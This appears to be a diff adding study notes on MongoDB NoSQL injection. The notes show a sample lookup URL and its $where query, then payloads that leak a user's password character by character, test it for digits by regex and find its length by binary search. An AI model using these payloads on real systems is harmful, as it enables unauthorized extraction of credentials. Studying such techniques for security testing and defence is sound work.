@@ -118,10 +118,17 @@ doesn't work
 4. Inject query operators in the JSON.
 
 
+### Exfiltrating data in MongoDB
 
-		
+`https://insecure-website.com/user/lookup?username=admin`
 
+the resprctive query is `{"$where":"this.username == 'admin'"}`
 
+- `admin' && this.password[0] == 'a' || 'a'=='b` this check fot the password first char is a
+  
+  - `admin' && this.password.match(/\d/) || 'a'=='b` this checks for the password contains digits , change regex to check for others
+
+- `administrator' && this.password.length < 30 || 'a'=='b` used to find length (use binary search technique)
 
 
 
